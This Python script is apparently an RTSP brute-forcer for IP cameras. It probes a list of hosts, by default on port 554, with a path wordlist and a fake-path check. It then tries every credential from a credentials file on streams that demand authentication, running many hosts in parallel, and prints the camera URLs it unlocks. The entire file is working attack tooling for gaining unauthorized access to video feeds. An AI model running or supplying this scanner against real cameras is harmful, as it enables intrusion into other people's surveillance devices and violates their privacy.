#!/usr/bin/env python
from concurrent.futures import ThreadPoolExecutor, as_completed
import logging
import os
from pathlib import Path
import sys

from fire import Fire
from tqdm import tqdm

from lib.net import RTSPConnection


FAKE_PATH = '/i_am_network_researcher'

WORK_DIR = Path(os.path.dirname(os.path.abspath(__file__)))

DATA_DIR = WORK_DIR / 'data'
LOCAL_DIR = WORK_DIR / 'local'

LOG_FILE = LOCAL_DIR / 'rtsp_brute.log'
PATHS_FILE = DATA_DIR / 'rtsp_paths1.txt'
CREDS_FILE = DATA_DIR / 'rtsp_creds_my.txt'


paths = [FAKE_PATH] + [ln.rstrip() for ln in open(PATHS_FILE)]
creds = [ln.rstrip() for ln in open(CREDS_FILE)]


def process_target(target_params: tuple[str, int, bool, str]) -> list[str]:
    host, port, single_path, interface = target_params

    results = []

    with RTSPConnection(host, port, interface) as connection:
        # OPTIONS query
        code, _ = connection.query()

        if code != 200:
            return results

        for path in paths:
            code, _ = connection.get(path)

            if code >= 500:
                return results

            # potential ban?
            # if code == 403:
            #     return results

            if code == 200:
                # if FAKE_PATH is ok,
                # root path will be ok too
                url = connection.get_url('/' if path == FAKE_PATH else path)
                results.append(url)

                if single_path:
                    return results

                continue

            if path == FAKE_PATH:  # no auth for fake path
                continue

            if code == 401:
                # bruteforcing creds
                for cred in creds:
                    code, _ = connection.auth(path, cred)

                    if code >= 500:
                        return results

                    if code == 200:
                        results.append(connection.get_url(path, cred))
                        if single_path:
                            return results
                        break  # one cred per path is enough

                # if no one cred accepted,
                # we have no cred for another paths i think
                if not results:
                    break

    return results


def main(H: str = '', w: int = None, sp: bool = False, i: str = '', d: bool = False, de: bool = False):
    if d or de:
        log_level = logging.DEBUG
        root_logger = logging.getLogger()
        root_logger.setLevel(log_level)

        file_handler = logging.FileHandler(LOG_FILE, 'w')
        file_handler.setLevel(log_level)
        root_logger.addHandler(file_handler)

        if de:
            stream_handler = logging.StreamHandler(sys.stderr)
            stream_handler.setLevel(log_level)
            root_logger.addHandler(stream_handler)

    results = []
    hosts_file_path = H or LOCAL_DIR / 'hosts_554.txt'

    with ThreadPoolExecutor(w) as executor:
        with open(hosts_file_path) as hosts_file:
            futures = {}

            for line in hosts_file:
                host = line.rstrip()
                port = 554

                if ':' in host:
                    host, port = host.split(':')

                arg = (host, port, sp, i)

                future = executor.submit(process_target, arg)
                futures[future] = arg

            with tqdm(total=len(futures)) as progress:
                for future in as_completed(futures):
                    host, port, *_ = futures[future]
                    res = future.result()
                    progress.update()
                    results += res

    for result in results:
        print(result)


if __name__ == "__main__":
    try:
        Fire(main)
    except KeyboardInterrupt:
        print('Interrupted by user')
        exit(130)
